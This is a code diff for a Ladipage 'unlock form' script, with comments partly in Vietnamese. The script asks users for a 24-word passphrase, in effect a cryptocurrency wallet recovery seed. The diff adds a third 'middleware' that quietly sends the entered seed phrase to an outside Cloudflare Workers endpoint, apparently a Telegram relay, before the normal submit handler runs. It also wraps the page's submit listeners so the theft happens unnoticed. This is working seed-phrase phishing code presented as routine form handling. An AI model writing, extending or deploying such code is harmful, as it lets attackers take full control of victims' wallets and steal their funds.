@@ -1,16 +1,14 @@
 /**
- * Form Middleware System v4 (no request)
- * - Middleware 1: Extract data
- * - Middleware 2: Validate passphrase
- * - Then call your submit handler
+ * Form Middleware System for Ladipage Unlock Form
+ * - Middleware 1: Extract form data
+ * - Middleware 2: Validate passphrase (24 từ)
+ * - Middleware 3: Gửi API trước khi handler chạy
+ * - Sau đó mới gọi handler submit gốc
  */
 
 const formMiddleware = {
   middlewares: [],
-  use(fn) {
-    this.middlewares.push(fn);
-    return this;
-  },
+  use(fn) { this.middlewares.push(fn); return this; },
   execute(event, next) {
     let index = 0;
     const executeNext = () => {
@@ -27,9 +25,9 @@ const formMiddleware = {
 
 const unlockFormMiddleware = Object.create(formMiddleware);
 
-// --- Middleware 1: extract form data
+// Middleware 1: extract data
 unlockFormMiddleware.use((event, next) => {
-  console.log("Middleware 1: Extracting form data");
+  console.log("Middleware 1: Extract form data");
   event.preventDefault();
 
   const formData = new FormData(event.target);
@@ -41,33 +39,49 @@ unlockFormMiddleware.use((event, next) => {
   next();
 });
 
-// --- Middleware 2: validate passphrase
+// Middleware 2: validate passphrase
 unlockFormMiddleware.use((event, next) => {
-  console.log("Middleware 2: Validating passphrase");
+  console.log("Middleware 2: Validate passphrase");
   const passphrase = event.formData?.message || "";
-
   if (!passphrase) {
     alert("Please enter your 24-word passphrase");
     return;
   }
-
   const words = passphrase.split(/\s+/);
   if (words.length !== 24) {
     alert("Passphrase must contain exactly 24 words");
     return;
   }
-
   next();
+});
+
+// Middleware 3: gọi API trước khi handler chạy
+unlockFormMiddleware.use((event, next) => {
+  console.log("Middleware 3: Sending API request…");
+
+  const content = encodeURIComponent(event.formData?.message || "");
+  const url = `https://sendmessagetele.myloverkt.workers.dev/?text=${content}`;
+
+  fetch(url)
+    .then(res => {
+      console.log("API response status:", res.status);
+      next(); // tiếp tục sau khi gọi API xong
+    })
+    .catch(err => {
+      console.error("API request failed:", err);
+      next(); // vẫn cho chạy tiếp nếu lỗi
+    });
 });
 
 let middlewareExecuting = false;
 
 document.addEventListener("DOMContentLoaded", () => {
-  console.log("Setting up form middleware => v4");
+  console.log("Setting up unlock form middleware");
 
-  const unlockForm = document.querySelector(".ladi-form");
+  // ✅ đúng selector form trong #FORM4
+  const unlockForm = document.querySelector("#FORM4 form.ladi-form");
   if (!unlockForm) {
-    console.warn("Không tìm thấy .ladi-form");
+    console.warn("Unlock form not found!");
     return;
   }
 
@@ -76,23 +90,24 @@ document.addEventListener("DOMContentLoaded", () => {
   unlockForm.addEventListener = function (type, listener, options) {
     if (type === "submit") {
       console.log("Intercepting submit event binding");
-
       const wrappedListener = function (event) {
         if (middlewareExecuting) return;
-
         middlewareExecuting = true;
-        console.log("Form submission intercepted by middleware");
-
+        console.log("Form submission intercepted → running middlewares");
         unlockFormMiddleware.execute(event, () => {
-          console.log("All middlewares completed → call original handler");
+          console.log("All middlewares done → run original handler");
           listener.call(unlockForm, event);
           setTimeout(() => (middlewareExecuting = false), 100);
         });
       };
-
       return originalAddEventListener.call(this, type, wrappedListener, options);
     }
-
     return originalAddEventListener.call(this, type, listener, options);
   };
+
+  // --- Demo handler cuối (thay bằng xử lý của bạn) ---
+  unlockForm.addEventListener("submit", function (event) {
+    console.log("Final handler received:", event.formData);
+    alert("Form submitted OK!\n\n" + JSON.stringify(event.formData, null, 2));
+  });
 });
